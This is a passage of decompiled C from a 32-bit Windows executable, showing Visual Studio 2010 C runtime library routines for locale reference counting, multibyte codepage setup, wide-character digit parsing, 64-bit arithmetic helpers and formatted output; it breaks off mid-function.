      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_0040bd59:
    setSBUpLow(unaff_EDI);
    goto LAB_0040bdc1;
  }
  if (DAT_00417b10 == 0) goto LAB_0040bdc1;
  goto LAB_0040bc12;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_0040bdd0(undefined4 param_1)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_004165a0)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_00416ac0 & 1) == 0)) {
          __lock(0xd);
          _DAT_00417b20 = ptVar3->mbcodepage;
          _DAT_00417b24 = ptVar3->ismbcodepage;
          _DAT_00417b28 = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_00417b14)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_004167c0)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_004168c8)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)PTR_DAT_004169c8);
          if ((LVar4 == 0) && (PTR_DAT_004169c8 != &DAT_004165a0)) {
            _free(PTR_DAT_004169c8);
          }
          PTR_DAT_004169c8 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_0040bf31();
        }
      }
      else if (local_24 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_004165a0) {
          _free(ptVar3);
        }
        piVar5 = __errno();
        *piVar5 = 0x16;
      }
    }
  }
  return local_24;
}



void FUN_0040bf31(void)

{
  FUN_0040da13(0xd);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2010 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_00416ac4) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2010 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_00416ac4) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2010 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_00416e98)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_00416ac8) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_00416ac4) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
    param_1 = (void *)((int)param_1 + -1);
  } while (param_1 != (void *)0x0);
  _free(_Memory);
  return;
}



// Library Function - Single Match
//  __updatetlocinfoEx_nolock
// 
// Library: Visual Studio 2010 Release

LONG * __cdecl __updatetlocinfoEx_nolock(LONG **param_1,LONG *param_2)

{
  LONG *pLVar1;
  
  if ((param_2 == (LONG *)0x0) || (param_1 == (LONG **)0x0)) {
    param_2 = (LONG *)0x0;
  }
  else {
    pLVar1 = *param_1;
    if (pLVar1 != param_2) {
      *param_1 = param_2;
      ___addlocaleref(param_2);
      if (((pLVar1 != (LONG *)0x0) && (___removelocaleref(pLVar1), *pLVar1 == 0)) &&
         (pLVar1 != (LONG *)&DAT_00416c30)) {
        ___freetlocinfo(pLVar1);
      }
    }
  }
  return param_2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetlocinfo
// 
// Library: Visual Studio 2010 Release

pthreadlocinfo __cdecl ___updatetlocinfo(void)

{
  _ptiddata p_Var1;
  pthreadlocinfo ptVar2;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00416ac0) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xc);
    ptVar2 = (pthreadlocinfo)&p_Var1->ptlocinfo;
    __updatetlocinfoEx_nolock((LONG **)ptVar2,(LONG *)PTR_DAT_00416d08);
    FUN_0040c2b5();
  }
  else {
    p_Var1 = __getptd();
    ptVar2 = p_Var1->ptlocinfo;
  }
  if (ptVar2 == (pthreadlocinfo)0x0) {
    __amsg_exit(0x20);
  }
  return ptVar2;
}



void FUN_0040c2b5(void)

{
  FUN_0040da13(0xc);
  return;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2010 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (0x2f < param_1) {
    if (param_1 < 0x3a) {
      return param_1 - 0x30;
    }
    iVar1 = 0xff10;
    if (param_1 < 0xff10) {
      iVar1 = 0x660;
      if (param_1 < 0x660) {
        return -1;
      }
      if (param_1 < 0x66a) goto LAB_0040c306;
      iVar1 = 0x6f0;
      if (param_1 < 0x6f0) {
        return -1;
      }
      if (param_1 < 0x6fa) goto LAB_0040c306;
      iVar1 = 0x966;
      if (param_1 < 0x966) {
        return -1;
      }
      if (param_1 < 0x970) goto LAB_0040c306;
      iVar1 = 0x9e6;
      if (param_1 < 0x9e6) {
        return -1;
      }
      if (param_1 < 0x9f0) goto LAB_0040c306;
      iVar1 = 0xa66;
      if (param_1 < 0xa66) {
        return -1;
      }
      if (param_1 < 0xa70) goto LAB_0040c306;
      iVar1 = 0xae6;
      if (param_1 < 0xae6) {
        return -1;
      }
      if (param_1 < 0xaf0) goto LAB_0040c306;
      iVar1 = 0xb66;
      if (param_1 < 0xb66) {
        return -1;
      }
      if (param_1 < 0xb70) goto LAB_0040c306;
      iVar1 = 0xc66;
      if (param_1 < 0xc66) {
        return -1;
      }
      if (param_1 < 0xc70) goto LAB_0040c306;
      iVar1 = 0xce6;
      if (param_1 < 0xce6) {
        return -1;
      }
      if (param_1 < 0xcf0) goto LAB_0040c306;
      iVar1 = 0xd66;
      if (param_1 < 0xd66) {
        return -1;
      }
      if (param_1 < 0xd70) goto LAB_0040c306;
      iVar1 = 0xe50;
      if (param_1 < 0xe50) {
        return -1;
      }
      if (param_1 < 0xe5a) goto LAB_0040c306;
      iVar1 = 0xed0;
      if (param_1 < 0xed0) {
        return -1;
      }
      if (param_1 < 0xeda) goto LAB_0040c306;
      iVar1 = 0xf20;
      if (param_1 < 0xf20) {
        return -1;
      }
      if (param_1 < 0xf2a) goto LAB_0040c306;
      iVar1 = 0x1040;
      if (param_1 < 0x1040) {
        return -1;
      }
      if (param_1 < 0x104a) goto LAB_0040c306;
      iVar1 = 0x17e0;
      if (param_1 < 0x17e0) {
        return -1;
      }
      if (param_1 < 0x17ea) goto LAB_0040c306;
      iVar1 = 0x1810;
      if (param_1 < 0x1810) {
        return -1;
      }
      uVar2 = 0x181a;
    }
    else {
      uVar2 = 0xff1a;
    }
    if (param_1 < uVar2) {
LAB_0040c306:
      return (uint)param_1 - iVar1;
    }
  }
  return -1;
}



// Library Function - Single Match
//  _iswctype
// 
// Library: Visual Studio 2010 Release

int __cdecl _iswctype(wint_t _C,wctype_t _Type)

{
  BOOL BVar1;
  ushort local_8 [2];
  
  if (_C != 0xffff) {
    if (_C < 0x100) {
      local_8[0] = *(ushort *)(PTR_DAT_00416ef0 + (uint)_C * 2);
    }
    else {
      BVar1 = GetStringTypeW(1,(LPCWSTR)&_C,1,local_8);
      if (BVar1 == 0) {
        local_8[0] = 0;
      }
    }
    return (uint)(local_8[0] & _Type);
  }
  return 0;
}



// Library Function - Single Match
//  __allmul
// 
// Library: Visual Studio 2010 Release

longlong __allmul(uint param_1,uint param_2,uint param_3,uint param_4)

{
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return CONCAT44((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
                  param_2 * param_3 + param_1 * param_4,
                  (int)((ulonglong)param_1 * (ulonglong)param_3));
}



// Library Function - Single Match
//  __aulldvrm
// 
// Library: Visual Studio 2010 Release

undefined8 __aulldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  
  uVar3 = param_1;
  uVar8 = param_4;
  uVar6 = param_2;
  uVar9 = param_3;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar5 = uVar8 >> 1;
      uVar9 = uVar9 >> 1 | (uint)((uVar8 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar8 = uVar5;
      uVar6 = uVar7;
    } while (uVar5 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar9;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar8 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar8)) ||
       ((param_2 <= uVar8 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2010 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2010 Release

void __fastcall _write_string(int param_1,undefined param_2,undefined4 param_3)

{
  int iVar1;
  int *in_EAX;
  int *piVar2;
  FILE *unaff_EDI;
  
  piVar2 = __errno();
  iVar1 = *piVar2;
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    piVar2 = __errno();
    *piVar2 = 0;
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar2 = __errno();
        if (*piVar2 != 0x2a) break;
        _write_char(unaff_EDI);
      }
    }
    piVar2 = __errno();
    if (*piVar2 == 0) {
      piVar2 = __errno();
      *piVar2 = iVar1;
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __output_s_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __output_s_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  FILE *pFVar1;
  int *piVar2;
  uint uVar3;
  code *pcVar4;
  errno_t eVar5;
  int iVar6;
  undefined *puVar7;
  int extraout_ECX;
  byte extraout_DL;
  byte extraout_DL_00;
  byte extraout_DL_01;
  byte bVar8;
  undefined uVar9;
  undefined extraout_DL_02;
  undefined4 extraout_EDX_00;
  undefined4 uVar10;
  int *piVar11;
  size_t sVar12;
  byte *pbVar13;
  bool bVar14;
  undefined8 uVar15;
  int **ppiVar16;
  int *piVar17;
  int *piVar18;
  localeinfo_struct *plVar19;
  int *local_27c;
  int *local_278;
  int local_274;
  undefined4 local_270;
  int *local_268;
  int local_264;
  int local_260;
  FILE *local_25c;
  int *local_258;
  localeinfo_struct local_254;
  int local_24c;
  char local_248;
  uint local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int **local_22c;
  int local_228;
  size_t local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined4 local_11;
  uint local_8;
  undefined4 extraout_EDX;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  local_25c = _File;
  local_22c = (int **)_ArgList;
  local_264 = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_260 = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_254,_Locale);
  if (_File != (FILE *)0x0) {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar3 = __fileno(_File);
      if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {
        puVar7 = &DAT_00416540;
      }
      else {
        puVar7 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_00418ea0)[(int)uVar3 >> 5]);
      }
      if ((puVar7[0x24] & 0x7f) == 0) {
        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {
          puVar7 = &DAT_00416540;
        }
        else {
          puVar7 = (undefined *)((uVar3 & 0x1f) * 0x40 + (&DAT_00418ea0)[(int)uVar3 >> 5]);
        }
        if ((puVar7[0x24] & 0x80) == 0) goto LAB_0040c736;
      }
    }
    else {
LAB_0040c736:
      if (_Format != (char *)0x0) {
        local_215 = *_Format;
        local_228 = 0;
        local_224 = 0;
        local_244 = 0;
        local_258 = (int *)0x0;
        if (local_215 != 0) {
          do {
            pbVar13 = (byte *)_Format + 1;
            local_240 = pbVar13;
            if (local_228 < 0) break;
            if ((byte)(local_215 - 0x20) < 0x59) {
              uVar3 = (byte)(&DAT_00413248)[(char)local_215] & 0xf;
            }
            else {
              uVar3 = 0;
            }
            local_244 = (uint)((byte)(&DAT_00413268)[local_244 + uVar3 * 9] >> 4);
            switch(local_244) {
            case 0:
switchD_0040c7c3_caseD_0:
              local_23c = 0;
              iVar6 = __isleadbyte_l((uint)local_215,&local_254);
              if (iVar6 != 0) {
                _write_char(local_25c);
                local_240 = (byte *)_Format + 2;
                if (*pbVar13 == 0) goto switchD_0040c7c3_caseD_9;
              }
              _write_char(local_25c);
              break;
            case 1:
              local_21c = (int *)0xffffffff;
              local_270 = 0;
              local_260 = 0;
              local_238 = (int *)0x0;
              local_234 = 0;
              local_214 = 0;
              local_23c = 0;
              break;
            case 2:
              if (local_215 == 0x20) {
                local_214 = local_214 | 2;
              }
              else if (local_215 == 0x23) {
                local_214 = local_214 | 0x80;
              }
              else if (local_215 == 0x2b) {
                local_214 = local_214 | 1;
              }
              else if (local_215 == 0x2d) {
                local_214 = local_214 | 4;
              }
              else if (local_215 == 0x30) {
                local_214 = local_214 | 8;
              }
              break;
            case 3:
              if (local_215 == 0x2a) {
                local_22c = (int **)((int)_ArgList + 4);
                local_238 = *(int **)_ArgList;
                if ((int)local_238 < 0) {
                  local_214 = local_214 | 4;
                  local_238 = (int *)-(int)local_238;
                }
              }
              else {
                local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)(char)local_215);
              }
              break;
            case 4:
              local_21c = (int *)0x0;
              break;
            case 5:
              if (local_215 == 0x2a) {
                local_22c = (int **)((int)_ArgList + 4);
                local_21c = *(int **)_ArgList;
                if ((int)local_21c < 0) {
                  local_21c = (int *)0xffffffff;
                }
              }
              else {
                local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)(char)local_215);
              }
              break;
            case 6:
              if (local_215 == 0x49) {
                bVar8 = *pbVar13;
                if ((bVar8 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
                  local_214 = local_214 | 0x8000;
                  local_240 = (byte *)_Format + 3;
                }
                else if ((bVar8 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
                  local_214 = local_214 & 0xffff7fff;
                  local_240 = (byte *)_Format + 3;
                }
                else if (((((bVar8 != 100) && (bVar8 != 0x69)) && (bVar8 != 0x6f)) &&
                         ((bVar8 != 0x75 && (bVar8 != 0x78)))) && (bVar8 != 0x58)) {
                  local_244 = 0;
                  goto switchD_0040c7c3_caseD_0;
                }
              }
              else if (local_215 == 0x68) {
                local_214 = local_214 | 0x20;
              }
              else if (local_215 == 0x6c) {
                if (*pbVar13 == 0x6c) {
                  local_214 = local_214 | 0x1000;
                  local_240 = (byte *)_Format + 2;
                }
                else {
                  local_214 = local_214 | 0x10;
                }
              }
              else if (local_215 == 0x77) {
                local_214 = local_214 | 0x800;
              }
              break;
            case 7:
              bVar8 = local_215;
              if ((char)local_215 < 'e') {
                if (local_215 == 100) {
LAB_0040ccb1:
                  local_214 = local_214 | 0x40;
LAB_0040ccb8:
                  local_224 = 10;
LAB_0040ccc2:
                  if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
                    local_22c = (int **)((int)_ArgList + 4);
                    if ((local_214 & 0x20) == 0) {
                      piVar2 = *(int **)_ArgList;
                      if ((local_214 & 0x40) == 0) {
                        piVar11 = (int *)0x0;
                      }
                      else {
                        piVar11 = (int *)((int)piVar2 >> 0x1f);
                      }
                    }
                    else {
                      if ((local_214 & 0x40) == 0) {
                        piVar2 = (int *)(uint)*(ushort *)_ArgList;
                      }
                      else {
                        piVar2 = (int *)(int)*(short *)_ArgList;
                      }
                      piVar11 = (int *)((int)piVar2 >> 0x1f);
                    }
                  }
                  else {
                    local_22c = (int **)((int)_ArgList + 8);
                    piVar2 = *(int **)_ArgList;
                    piVar11 = *(int **)((int)_ArgList + 4);
                  }
                  if ((((local_214 & 0x40) != 0) && ((int)piVar11 < 1)) && ((int)piVar11 < 0)) {
                    bVar14 = piVar2 != (int *)0x0;
                    piVar2 = (int *)-(int)piVar2;
                    piVar11 = (int *)-(int)((int)piVar11 + (uint)bVar14);
                    local_214 = local_214 | 0x100;
                  }
                  uVar15 = CONCAT44(piVar11,piVar2);
                  if ((local_214 & 0x9000) == 0) {
                    piVar11 = (int *)0x0;
                  }
                  if ((int)local_21c < 0) {
                    local_21c = (int *)0x1;
                  }
                  else {
                    local_214 = local_214 & 0xfffffff7;
                    if (0x200 < (int)local_21c) {
                      local_21c = (int *)0x200;
                    }
                  }
                  if (((uint)piVar2 | (uint)piVar11) == 0) {
                    local_234 = 0;
                  }
                  piVar2 = &local_11;
                  while( true ) {
                    piVar17 = piVar11;
                    bVar8 = (byte)((ulonglong)uVar15 >> 0x20);
                    piVar11 = (int *)((int)local_21c + -1);
                    if (((int)local_21c < 1) && (((uint)uVar15 | (uint)piVar17) == 0)) break;
                    local_21c = piVar11;
                    uVar15 = __aulldvrm((uint)uVar15,(uint)piVar17,local_224,(int)local_224 >> 0x1f)
                    ;
                    iVar6 = extraout_ECX + 0x30;
                    if (0x39 < iVar6) {
                      iVar6 = iVar6 + local_264;
                    }
                    *(char *)piVar2 = (char)iVar6;
                    piVar2 = (int *)((int)piVar2 + -1);
                    piVar11 = (int *)((ulonglong)uVar15 >> 0x20);
                    local_268 = piVar17;
                  }
                  local_224 = (int)&local_11 + -(int)piVar2;
                  local_220 = (int *)((int)piVar2 + 1);
                  local_21c = piVar11;
                  if (((local_214 & 0x200) != 0) &&
                     ((local_224 == 0 || (*(char *)local_220 != '0')))) {
                    *(char *)piVar2 = '0';
                    local_224 = (int)&local_11 + -(int)piVar2 + 1;
                    local_220 = piVar2;
                  }
                }
                else if ((char)local_215 < 'T') {
                  if (local_215 == 0x53) {
                    if ((local_214 & 0x830) == 0) {
                      local_214 = local_214 | 0x800;
                    }
                    goto LAB_0040cae0;
                  }
                  if (local_215 == 0x41) {
LAB_0040ca5e:
                    local_215 = local_215 + 0x20;
                    local_270 = 1;
LAB_0040ca71:
                    local_214 = local_214 | 0x40;
                    local_268 = (int *)0x200;
                    piVar2 = local_210;
                    piVar11 = local_268;
                    piVar17 = local_210;
                    if ((int)local_21c < 0) {
                      local_21c = (int *)0x6;
                    }
                    else if (local_21c == (int *)0x0) {
                      if (local_215 == 0x67) {
                        local_21c = (int *)0x1;
                      }
                    }
                    else {
                      if (0x200 < (int)local_21c) {
                        local_21c = (int *)0x200;
                      }
                      if (0xa3 < (int)local_21c) {
                        piVar11 = (int *)((int)local_21c + 0x15d);
                        local_220 = local_210;
                        local_258 = (int *)__malloc_crt((size_t)piVar11);
                        piVar2 = local_258;
                        piVar17 = local_258;
                        if (local_258 == (int *)0x0) {
                          local_21c = (int *)0xa3;
                          piVar2 = local_210;
                          piVar11 = local_268;
                          piVar17 = local_220;
                        }
                      }
                    }
                    local_220 = piVar17;
                    local_268 = piVar11;
                    local_27c = *(int **)_ArgList;
                    local_22c = (int **)((int)_ArgList + 8);
                    local_278 = *(int **)((int)_ArgList + 4);
                    plVar19 = &local_254;
                    iVar6 = (int)(char)local_215;
                    ppiVar16 = &local_27c;
                    piVar11 = piVar2;
                    piVar17 = local_268;
                    piVar18 = local_21c;
                    uVar10 = local_270;
                    pcVar4 = (code *)DecodePointer(PTR_LAB_00416d44);
                    (*pcVar4)(ppiVar16,piVar11,piVar17,iVar6,piVar18,uVar10,plVar19);
                    uVar3 = local_214 & 0x80;
                    if ((uVar3 != 0) && (local_21c == (int *)0x0)) {
                      plVar19 = &local_254;
                      piVar11 = piVar2;
                      pcVar4 = (code *)DecodePointer(PTR_LAB_00416d50);
                      (*pcVar4)(piVar11,plVar19);
                    }
                    if ((local_215 == 0x67) && (uVar3 == 0)) {
                      plVar19 = &local_254;
                      piVar11 = piVar2;
                      pcVar4 = (code *)DecodePointer(PTR_LAB_00416d4c);
                      (*pcVar4)(piVar11,plVar19);
                    }
                    if (*(char *)piVar2 == '-') {
                      local_214 = local_214 | 0x100;
                      piVar2 = (int *)((int)piVar2 + 1);
                      local_220 = piVar2;
                    }
LAB_0040cc13:
                    local_224 = _strlen((char *)piVar2);
                    bVar8 = extraout_DL_00;
                  }
                  else if (local_215 == 0x43) {
                    if ((local_214 & 0x830) == 0) {
                      local_214 = local_214 | 0x800;
                    }
LAB_0040cb53:
                    local_22c = (int **)((int)_ArgList + 4);
                    if ((local_214 & 0x810) == 0) {
                      local_210[0]._0_1_ = *_ArgList;
                      local_224 = 1;
                    }
                    else {
                      eVar5 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,
                                        *(wchar_t *)_ArgList);
                      bVar8 = extraout_DL;
                      if (eVar5 != 0) {
                        local_260 = 1;
                        bVar8 = extraout_DL;
                      }
                    }
                    local_220 = local_210;
                  }
                  else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_0040ca5e;
                }
                else {
                  if (local_215 == 0x58) goto LAB_0040ce0b;
                  if (local_215 == 0x5a) {
                    piVar2 = *(int **)_ArgList;
                    local_22c = (int **)((int)_ArgList + 4);
                    if ((piVar2 == (int *)0x0) ||
                       (local_220 = (int *)piVar2[1], local_220 == (int *)0x0)) {
                      local_220 = (int *)PTR_DAT_00416d24;
                      piVar2 = (int *)PTR_DAT_00416d24;
                      goto LAB_0040cc13;
                    }
                    local_224 = (size_t)*(wchar_t *)piVar2;
                    if ((local_214 & 0x800) == 0) {
                      local_23c = 0;
                    }
                    else {
                      local_224 = (int)local_224 / 2;
                      local_23c = 1;
                      bVar8 = (byte)(*(wchar_t *)piVar2 >> 7);
                    }
                  }
                  else {
                    if (local_215 == 0x61) goto LAB_0040ca71;
                    if (local_215 == 99) goto LAB_0040cb53;
                  }
                }
LAB_0040cfe5:
                if (local_260 == 0) {
                  if ((local_214 & 0x40) != 0) {
                    if ((local_214 & 0x100) == 0) {
                      if ((local_214 & 1) == 0) {
                        if ((local_214 & 2) == 0) goto LAB_0040d02e;
                        local_230 = 0x20;
                      }
                      else {
                        local_230 = 0x2b;
                      }
                    }
                    else {
                      local_230 = 0x2d;
                    }
                    local_234 = 1;
                  }
LAB_0040d02e:
                  piVar11 = (int *)((int)local_238 + (-local_234 - local_224));
                  local_268 = piVar11;
